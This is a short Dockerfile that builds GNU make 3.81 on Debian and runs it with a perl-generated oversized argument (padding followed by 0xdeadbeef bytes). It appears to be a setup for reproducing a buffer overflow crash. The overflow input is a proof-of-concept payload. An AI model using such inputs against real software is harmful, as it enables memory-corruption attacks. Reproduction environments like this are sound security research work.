FROM debian:latest
MAINTAINER "Dongliang Mu" <mudongliangabcd@gmail.com>
RUN apt-get -y update && apt-get -y upgrade
RUN apt-get install -y build-essential screenfetch wget
RUN cd; wget http://ftp.gnu.org/gnu/make/make-3.81.tar.gz; tar -xvf make-3.81.tar.gz;
RUN cd /root/make-3.81/; ./configure; make;
RUN rm -rf /var/lib/apt/lists/*
CMD /root/make-3.81/make `perl -e 'print "A" x 4000 . "B"x96 . "\xef\xbe\xad\xde"x4'`
